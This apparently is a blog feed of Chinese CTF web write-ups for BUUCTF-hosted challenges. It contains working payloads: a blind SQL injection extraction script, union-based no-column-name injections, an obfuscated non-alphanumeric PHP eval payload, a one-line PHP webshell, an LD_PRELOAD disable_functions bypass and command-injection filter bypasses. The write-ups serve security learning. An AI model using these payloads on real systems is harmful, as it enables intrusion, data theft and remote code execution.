&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e"># sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">)&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (x, mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		reponse&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Click&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> reponse&lt;span style="color:#f92672">.&lt;/span>text:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			low&lt;span style="color:#f92672">=&lt;/span>mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			high &lt;span style="color:#f92672">=&lt;/span> mid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		mid &lt;span style="color:#f92672">=&lt;/span> (low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	result &lt;span style="color:#f92672">+=&lt;/span> chr(int(mid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	print(result)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我是直接使用了判断字符的返回值1或0作为id的参数，因为使用&lt;strong>group_concat&lt;/strong>拼接时字符串有逗号&lt;code>,&lt;/code>所以字符ascii需要至少从44开始。&lt;/p>
&lt;p>下面是查询到的两个表F1naI1y 、Flaaaaag及结构&lt;/p>
&lt;blockquote>
&lt;p>F1naI1y ====&amp;gt; id,username,password&lt;/p>
&lt;p>Flaaaaag ====&amp;gt; id,fl4gawsl&lt;/p></description></item><item><title>WUSTCTF2020 朴实无华</title><link>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</link><pubDate>Fri, 16 Apr 2021 15:33:32 +0000</pubDate><guid>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</guid><description>&lt;p>进入页面直接报错&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416103737.png" alt="">&lt;/p>
&lt;p>试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容&lt;/p>
&lt;blockquote>
&lt;p>User-agent: *
Disallow: /fAke_f1agggg.php&lt;/p>&lt;/blockquote>
&lt;p>访问&lt;code>fAke_f1agggg.php&lt;/code>并且抓包，在响应头里有提示。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416105630.png" alt="">&lt;/p>
&lt;p>访问&lt;code>fl4g.php&lt;/code>才正式开始，源码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">img&lt;/span> &lt;span style="color:#a6e22e">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/img.jpg&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">error_reporting&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">highlight_file&lt;/span>(&lt;span style="color:#66d9ef">__file__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//level 1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;num&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $num &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;num&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">intval&lt;/span>($num) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2020&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">intval&lt;/span>($num &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2021&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;金钱解决不了穷人的本质问题&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;去非洲吧&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//level 2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;md5&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $md5&lt;span style="color:#f92672">=&lt;/span>$_GET[&lt;span style="color:#e6db74">&amp;#39;md5&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ($md5&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#a6e22e">md5&lt;/span>($md5))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;去非洲吧&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//get flag
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;get_flag&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $get_flag &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;get_flag&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">strstr&lt;/span>($get_flag,&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>)){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $get_flag &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">str_ireplace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;cat&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wctf2020&amp;#34;&lt;/span>, $get_flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">system&lt;/span>($get_flag);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;快到非洲了&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;去非洲吧&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>一关一关的&lt;strong>bypass&lt;/strong>。&lt;/p></description></item><item><title>SWPU2019 Web1</title><link>/posts/ctf/swpu2019web1/</link><pubDate>Thu, 15 Apr 2021 09:55:17 +0000</pubDate><guid>/posts/ctf/swpu2019web1/</guid><description>&lt;p>一个登陆界面，再看下url地址为login.php，确认了使用的是php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091617.png" alt="">&lt;/p>
&lt;p>直接查看源码，在源码中找到了register.php。先注册一个进去看一看。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091705.png" alt="">&lt;/p>
&lt;p>是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号&lt;code>'&lt;/code>试一试&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091924.png" alt="">&lt;/p>
&lt;p>广告详情中出现了数据库报错&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415091959.png" alt="">猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是&lt;strong>字符型单引号闭合&lt;/strong>。&lt;/p>
&lt;p>接下来是尝试过滤。我试出来的有空格（使用&lt;code>/**/&lt;/code>绕过）、or，and（可以使用&amp;amp;&amp;amp;，||），同时or被过滤，就说明保存数据库表名的库&lt;strong>information_schema&lt;/strong>没有办法查询，并且&lt;strong>orderby&lt;/strong>也不能使用，需要使用其他办法获取表内容。&lt;/p>
&lt;p>测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 &lt;code>LIMIT 0,1&lt;/code>需要闭合，所以最后添加了一个单引号&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415092716.png" alt="">&lt;/p>
&lt;p>说明回显位是2和3。&lt;/p>
&lt;p>由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。&lt;del>这种没有办法查询表名的题目表名应该都不会设置太难&lt;/del>&lt;/p>
&lt;p>测试的语句&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>当测到&lt;code>users&lt;/code>表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。&lt;/p>
&lt;p>首先讲解一波&lt;strong>无列名注入&lt;/strong>。&lt;/p>
&lt;p>先来个正常表（flag）的查询&lt;/p>
&lt;p>&lt;img src="D:%5CDROPS%5CCTF%E6%AF%94%E8%B5%9B%E9%A2%98%E8%A7%A3%5CBUUCTF%5CWeb%5BSWPU2019%5DWeb1%5C20210415094632.png" alt="">&lt;/p>
&lt;p>我们知道在sql语句查询的时候，可以给列名起别名形如&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094059.png" alt="">&lt;/p>
&lt;p>使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094238.png" alt="">&lt;/p>
&lt;p>所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210415094814.png" alt="">&lt;/p>
&lt;p>需要为子查询的结果再起一个别名（图中为&lt;code>x&lt;/code>），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用&lt;code>group_concat&lt;/code>函数输出自己构造的表名。&lt;/p>
&lt;p>所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。&lt;/p>
&lt;p>最终的payload：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>BUUCTF寒假刷题-Web</title><link>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</link><pubDate>Mon, 18 Jan 2021 16:58:56 +0000</pubDate><guid>/posts/ctf/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/</guid><description>&lt;p>寒假横向刷题（尽量）
&lt;a href="https://buuoj.cn/challenges#">BUUCTF&lt;/a>
💗🧡💛💚💙💜🤎🖤🤍
&lt;strong>题都写这一个里面了，可以先用&lt;code>Ctrl+F&lt;/code>搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨&lt;/strong>&lt;/p>
&lt;h1 id="20210115">2021.01.15&lt;/h1>
&lt;h1 id="hctf-2018warmup">[HCTF 2018]WarmUp&lt;/h1>
&lt;p>进到靶机一个硕大的滑稽，查看源码有提示source.php&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210120101413.png" alt="">&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
 highlight_file(__FILE__);
 class emmm
 {
 public static function checkFile(&amp;amp;$page)
 {
 $whitelist = [&amp;#34;source&amp;#34;=&amp;gt;&amp;#34;source.php&amp;#34;,&amp;#34;hint&amp;#34;=&amp;gt;&amp;#34;hint.php&amp;#34;];
 if (! isset($page) || !is_string($page)) {
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }

 if (in_array($page, $whitelist)) {
 return true;
 }

 $_page = mb_substr(
 $page,
 0,
 mb_strpos($page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }

 $_page = urldecode($page);
 $_page = mb_substr(
 $_page,
 0,
 mb_strpos($_page . &amp;#39;?&amp;#39;, &amp;#39;?&amp;#39;)
 );
 if (in_array($_page, $whitelist)) {
 return true;
 }
 echo &amp;#34;you can&amp;#39;t see it&amp;#34;;
 return false;
 }
 }

 if (! empty($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; is_string($_REQUEST[&amp;#39;file&amp;#39;])
 &amp;amp;&amp;amp; emmm::checkFile($_REQUEST[&amp;#39;file&amp;#39;])
 ) {
 include $_REQUEST[&amp;#39;file&amp;#39;];
 exit;
 } else {
 echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;img src=\&amp;#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&amp;#34; /&amp;gt;&amp;#34;;
 } 
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>发现白名单有source.php和hint.php，先去查看一下hint.php&lt;/p></description></item><item><title>极客大挑战 2019 RCE ME</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="极客大挑战-2019rce-me">[极客大挑战 2019]RCE ME&lt;/h1>
&lt;p>源码：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
 $code=$_GET[&amp;#39;code&amp;#39;];
 if(strlen($code)&amp;gt;40){
 die(&amp;#34;This is too Long.&amp;#34;);
 }
 if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
 die(&amp;#34;NO.&amp;#34;);
 }
 @eval($code);
}
else{
 highlight_file(__FILE__);
}

// ?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>分析一波，GET请求获得&lt;code>code&lt;/code>，想要通过的话需要绕过两个检测：&lt;/p>
&lt;ol>
&lt;li>payload长度小于40&lt;/li>
&lt;li>不能包含&lt;code>a-z、A-Z、0-9&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>和之前做过DMCTF里的一个不能用数字和字母构造payload一样，当时参考的博客是phith0n师傅的:&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell&lt;/a>，这次摸到了相关文章：&lt;a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇&lt;/a>。&lt;/p>
&lt;p>使用&lt;code>url编码&lt;/code>+&lt;code>~&lt;/code>取反构造不可见字符串，然后加上php7版本以后支持了使用：&lt;code>($a)()&lt;/code>这样的方法动态执行函数，所以我们可以构造payload：&lt;code>assert(eval($_POST[‘a’]))&lt;/code>&lt;/p>
&lt;p>先构造&lt;code>assert&lt;/code>：&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;assert&amp;#39;);

//结果：%9E%8C%8C%9A%8D%8B
&lt;/code>&lt;/pre>&lt;p>再构造&lt;code>eval($_POST['a'])&lt;/code>：&lt;/p>
&lt;pre tabindex="0">&lt;code>echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);

//结果：%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code>&lt;/pre>&lt;p>完整payload：&lt;/p>
&lt;pre tabindex="0">&lt;code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code>&lt;/pre>&lt;p>网站获得请求以后会进行url解码，由于是不可见字符可以绕过长度和正则表达式，之后执行代码时，前面的&lt;code>~&lt;/code>取反再获得真正的函数名。&lt;/p>
&lt;p>使用蚁剑连接，进后台在根目录找到了flag、readflag。打开flag内容为空，又打开readflag文件是一堆乱码，但是看到了文件头是&lt;code>ELF&lt;/code>是linux的可执行文件。那么很有可能就是执行readflag才能获得flag，但是在终端执行时出现了一些问题：无论输入什么，终端都只会返回&lt;code>ret=127&lt;/code>：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png" alt="">&lt;/p>
&lt;p>搜索了一波，原来是是&lt;strong>disable_function&lt;/strong>搞的鬼，这个表可以在phpinfo()中查看：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png" alt="">&lt;/p>
&lt;p>因为&lt;code>system&lt;/code>、&lt;code>exec&lt;/code>、&lt;code>shell_exec&lt;/code>等命令执行的函数都被禁止了，目前我理解的webshell就是通过这些函数才能在终端执行命令的，所以终端基本是个废的，所以就是寻找绕过&lt;strong>disable_function&lt;/strong>的方法，网上有很多其他方法，其中一个方法：&lt;/p>
&lt;p>&lt;strong>利用环境变量LD_PRELOAD来绕过&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>php的mail函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，如果我们能劫持sendmail程序，再用mail函数来触发就能实现我们的目的&lt;/p>
&lt;p>LD_PRELOAD是Linux系统的下一个有趣的环境变量：“它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。&lt;/p>&lt;/blockquote>
&lt;p>正好蚁剑的插件中就有一个名为：&lt;a href="https://github.com/Medicean/as_bypass_php_disable_functions">as_bypass_php_disable_functions&lt;/a>的插件，可以选择在插件市场安装或是手动安装（github有步骤）。安装以后右键shell选择加载插件：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png" alt="">&lt;/p>
&lt;p>插件的工作原理是自动上传几个绕过的文件，然后再用蚁剑连接上传的文件即可实现绕过，但是一开始的&lt;code>/var/www/html&lt;/code>目录是没有上传权限的，我右键以后发现能修改权限，改成0777：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png" alt="">&lt;/p>
&lt;blockquote>
&lt;p>在这里我还遇到了问题，使用原来的shell执行插件功能以后，终端还是没有权限，但是我尝试了自己又上传了一个一句话木马，用这个新的一句话木马执行插件才成功，具体原因我也不清楚，如果有师傅知道原因求告知。&lt;/p>&lt;/blockquote>
&lt;p>上传一句话木马233.php：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code>&lt;/pre>&lt;p>再用一句话木马的shell执行插件：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png" alt="">&lt;/p>
&lt;p>进入shell，目录下面多了一个名为**.antproxy.php**的文件：&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png" alt="">&lt;/p>
&lt;p>再使用蚁剑连接**.antproxy.php**，密码是运行插件的那个shell的密码，这时候就可以开开心心的去根目录下执行readflag获得flag辣。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png" alt="">&lt;/p>
&lt;p>flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p></description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping&lt;/h1>
&lt;p>题目链接：https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p>
&lt;p>和DMCTF做的那道&lt;strong>pingpingping&lt;/strong>类似，同样是使用管道符构造payload，先使用：&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=127.0.0.1|ls
&lt;/code>&lt;/pre>&lt;p>目录下有两个文件：&lt;code>flag.php&lt;/code>、&lt;code>index.php&lt;/code>。首先试出来了空格被过滤，使用以下绕过空格：&lt;/p>
&lt;pre tabindex="0">&lt;code>$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
&amp;lt; 
&amp;lt;&amp;gt; 
{cat,flag.php} //用逗号实现了空格功能
%20 
%09 
&lt;/code>&lt;/pre>&lt;p>在linux下反单引号里面的指令会被执行 &lt;strong>`ls`&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>?ip=|cat$IFS`ls`
&lt;/code>&lt;/pre>&lt;p>会输出该目录下所有可以打开的文件，可以查看&lt;strong>index.php&lt;/strong>的部分源码有哪些过滤：&lt;/p>
